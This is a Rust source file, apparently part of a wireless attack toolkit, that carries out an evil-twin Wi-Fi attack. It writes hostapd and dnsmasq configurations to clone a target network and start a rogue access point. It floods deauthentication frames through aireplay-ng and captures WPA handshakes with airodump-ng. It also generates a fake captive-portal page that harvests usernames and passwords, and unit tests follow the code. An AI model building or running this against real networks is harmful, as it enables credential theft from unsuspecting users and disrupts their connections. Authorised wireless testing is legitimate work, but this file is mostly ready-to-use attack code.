use kraken_errors::WirelessError;
use serde::{Deserialize, Serialize};
use std::fs;
use std::process::Command;

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct EvilTwinConfig {
    pub interface: String,
    pub target_ssid: String,
    pub target_bssid: String,
    pub channel: u16,
    pub encryption: String,
    pub passphrase: Option<String>,
    pub deauth_first: bool,
    pub captive_portal: bool,
}

impl Default for EvilTwinConfig {
    fn default() -> Self {
        EvilTwinConfig {
            interface: "wlan0".to_string(),
            target_ssid: "FreeWiFi".to_string(),
            target_bssid: "00:11:22:33:44:55".to_string(),
            channel: 6,
            encryption: "WPA2".to_string(),
            passphrase: None,
            deauth_first: true,
            captive_portal: false,
        }
    }
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct EvilTwinStatus {
    pub running: bool,
    pub interface: String,
    pub target_ssid: String,
    pub target_bssid: String,
    pub channel: u16,
    pub clients_connected: usize,
    pub deauth_sent: usize,
}

pub struct EvilTwin;

impl Default for EvilTwin {
    fn default() -> Self {
        Self::new()
    }
}

impl EvilTwin {
    pub fn new() -> Self {
        EvilTwin
    }

    pub fn create_hostapd_config(config: &EvilTwinConfig) -> String {
        let mut conf = format!(
            "interface={}\nssid={}\nchannel={}\nhw_mode=g\n",
            config.interface, config.target_ssid, config.channel
        );

        match config.encryption.as_str() {
            "WPA2" => {
                conf.push_str("wpa=2\nwpa_passphrase=");
                conf.push_str(config.passphrase.as_deref().unwrap_or("password123"));
                conf.push_str("\nwpa_key_mgmt=WPA-PSK\nwpa_pairwise=CCMP\nrsn_pairwise=CCMP\n");
            }
            "WPA" => {
                conf.push_str("wpa=1\nwpa_passphrase=");
                conf.push_str(config.passphrase.as_deref().unwrap_or("password123"));
                conf.push_str("\nwpa_key_mgmt=WPA-PSK\nwpa_pairwise=TKIP\n");
            }
            "OPEN" => {
                conf.push_str("none\n");
            }
            _ => {
                conf.push_str("wpa=2\nwpa_passphrase=password123\nwpa_key_mgmt=WPA-PSK\n");
            }
        }

        conf
    }

    pub fn create_dnsmasq_config(interface: &str, gateway: &str) -> String {
        format!(
            "interface={}\nbind-interfaces\ndhcp-range=192.168.1.10,192.168.1.100,12h\ndhcp-option=3,{}\ndhcp-option=6,{}\nlog-dhcp\n",
            interface, gateway, gateway
        )
    }

    pub fn start_ap(config: &EvilTwinConfig) -> Result<EvilTwinStatus, WirelessError> {
        let hostapd_conf = Self::create_hostapd_config(config);
        let dnsmasq_conf = Self::create_dnsmasq_config(&config.interface, "192.168.1.1");

        fs::write("/tmp/hostapd.conf", &hostapd_conf)
            .map_err(|e| WirelessError::Io(std::io::Error::new(std::io::ErrorKind::Other, format!("Failed to write hostapd config: {}", e))))?;
        fs::write("/tmp/dnsmasq.conf", &dnsmasq_conf)
            .map_err(|e| WirelessError::Io(std::io::Error::new(std::io::ErrorKind::Other, format!("Failed to write dnsmasq config: {}", e))))?;

        Command::new("ip")
            .args(["link", "set", &config.interface, "up"])
            .output()
            .map_err(|e| WirelessError::Command(format!("Failed to bring up interface: {}", e)))?;

        Command::new("ip")
            .args(["addr", "add", "192.168.1.1/24", "dev", &config.interface])
            .output()
            .ok();

        let hostapd = Command::new("hostapd")
            .args(["/tmp/hostapd.conf"])
            .spawn();

        match hostapd {
            Ok(_) => {
                Command::new("dnsmasq")
                    .args(["-C", "/tmp/dnsmasq.conf"])
                    .spawn()
                    .ok();

                Ok(EvilTwinStatus {
                    running: true,
                    interface: config.interface.clone(),
                    target_ssid: config.target_ssid.clone(),
                    target_bssid: config.target_bssid.clone(),
                    channel: config.channel,
                    clients_connected: 0,
                    deauth_sent: 0,
                })
            }
            Err(e) => Err(WirelessError::Command(format!("Failed to start hostapd: {}", e))),
        }
    }

    pub fn send_deauth(interface: &str, bssid: &str, client: &str, count: u32) -> Result<u32, WirelessError> {
        let mut sent = 0;
        for _ in 0..count {
            let output = Command::new("aireplay-ng")
                .args(["--deauth", "1", "-a", bssid, "-c", client, interface])
                .output()
                .map_err(|e| WirelessError::Command(format!("deauth failed: {}", e)))?;

            if output.status.success() {
                sent += 1;
            }
        }
        Ok(sent)
    }

    pub fn capture_handshake(interface: &str, bssid: &str, output: &str) -> Result<String, WirelessError> {
        let mut child = Command::new("airodump-ng")
            .args(["--bssid", bssid, "-w", output, interface])
            .spawn()
            .map_err(|e| WirelessError::Command(format!("airodump-ng failed: {}", e)))?;

        std::thread::sleep(std::time::Duration::from_secs(10));

        child.kill().ok();

        Ok(format!("{}.cap", output))
    }

    pub fn stop_ap(interface: &str) -> Result<(), WirelessError> {
        Command::new("pkill")
            .args(["hostapd"])
            .output()
            .ok();

        Command::new("pkill")
            .args(["dnsmasq"])
            .output()
            .ok();

        Command::new("ip")
            .args(["link", "set", interface, "down"])
            .output()
            .ok();

        Ok(())
    }

    pub fn generate_captive_portal_html(ssid: &str) -> String {
        format!(
            r#"<!DOCTYPE html>
<html>
<head>
    <title>WiFi Login</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body {{ font-family: Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; background: #f0f2f5; }}
        .container {{ background: white; padding: 2rem; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); max-width: 400px; width: 90%; }}
        h1 {{ color: #1a73e8; text-align: center; }}
        input {{ width: 100%; padding: 12px; margin: 8px 0; border: 1px solid #ddd; border-radius: 4px; box-sizing: border-box; }}
        button {{ width: 100%; padding: 12px; background: #1a73e8; color: white; border: none; border-radius: 4px; cursor: pointer; font-size: 16px; }}
        button:hover {{ background: #1557b0; }}
    </style>
</head>
<body>
    <div class="container">
        <h1>{}</h1>
        <p style="text-align: center; color: #666;">Connect to WiFi network</p>
        <form action="/login" method="POST">
            <input type="text" name="username" placeholder="Username" required>
            <input type="password" name="password" placeholder="Password" required>
            <button type="submit">Connect</button>
        </form>
    </div>
</body>
</html>"#,
            ssid
        )
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_default_config() {
        let config = EvilTwinConfig::default();
        assert_eq!(config.channel, 6);
        assert_eq!(config.encryption, "WPA2");
    }

    #[test]
    fn test_create_hostapd_config_wpa2() {
        let config = EvilTwinConfig::default();
        let conf = EvilTwin::create_hostapd_config(&config);
        assert!(conf.contains("wpa=2"));
        assert!(conf.contains("CCMP"));
    }

    #[test]
    fn test_create_hostapd_config_open() {
        let mut config = EvilTwinConfig::default();
        config.encryption = "OPEN".to_string();
        let conf = EvilTwin::create_hostapd_config(&config);
        assert!(conf.contains("none"));
    }

    #[test]
    fn test_create_dnsmasq_config() {
        let conf = EvilTwin::create_dnsmasq_config("wlan0", "192.168.1.1");
        assert!(conf.contains("interface=wlan0"));
        assert!(conf.contains("dhcp-range=192.168.1.10,192.168.1.100,12h"));
    }

    #[test]
    fn test_generate_captive_portal() {
        let html = EvilTwin::generate_captive_portal_html("FreeWiFi");
        assert!(html.contains("FreeWiFi"));
        assert!(html.contains("username"));
        assert!(html.contains("password"));
    }

    #[test]
    fn test_evil_twin_status_serialization() {
        let status = EvilTwinStatus {
            running: true,
            interface: "wlan0".to_string(),
            target_ssid: "Test".to_string(),
            target_bssid: "00:11:22:33:44:55".to_string(),
            channel: 6,
            clients_connected: 5,
            deauth_sent: 10,
        };
        let json = serde_json::to_string_pretty(&status).unwrap();
        assert!(json.contains("running"));
        assert!(json.contains("clients_connected"));
    }

    #[test]
    fn test_evil_twin_config_serialization() {
        let config = EvilTwinConfig::default();
        let json = serde_json::to_string_pretty(&config).unwrap();
        assert!(json.contains("target_ssid"));
        assert!(json.contains("channel"));
    }
}